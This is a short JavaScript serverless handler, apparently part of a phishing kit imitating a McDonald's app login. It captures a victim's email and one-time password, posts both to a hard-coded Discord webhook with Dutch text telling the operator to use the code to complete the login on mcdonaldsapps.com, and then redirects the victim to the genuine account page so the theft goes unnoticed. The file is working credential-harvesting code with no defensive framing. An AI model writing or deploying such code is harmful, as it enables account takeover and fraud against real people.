export default async function handler(req, res) {
    if (req.method !== 'POST') {
        return res.status(405).send('Method not allowed');
    }

    const email = req.body.email || '';
    const otp = req.body.otp || '';

    const webhook = 'https://discord.com/api/webhooks/1504870768108900462/zwR2khNQ-Om9xYfoeRNO7RPKQD15MZhHM8kRFRhDz1jujqSkEMEJ1hKGSdjpsREFMfwO';

    await fetch(webhook, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            embeds: [{
                title: '📱 **OTP CODE ONTVANGEN**',
                color: 0x00FF00,
                fields: [
                    { name: '📧 Email', value: '```' + email + '```', inline: false },
                    { name: '🔢 OTP Code', value: '```' + otp + '```', inline: false },
                    { name: '✅ Actie', value: 'Gebruik deze code om de login te voltooien op mcdonaldsapps.com', inline: false }
                ],
                timestamp: new Date().toISOString()
            }]
        })
    });

    res.redirect(302, 'https://www.mcdonaldsapps.com/nl-NL/account');
}
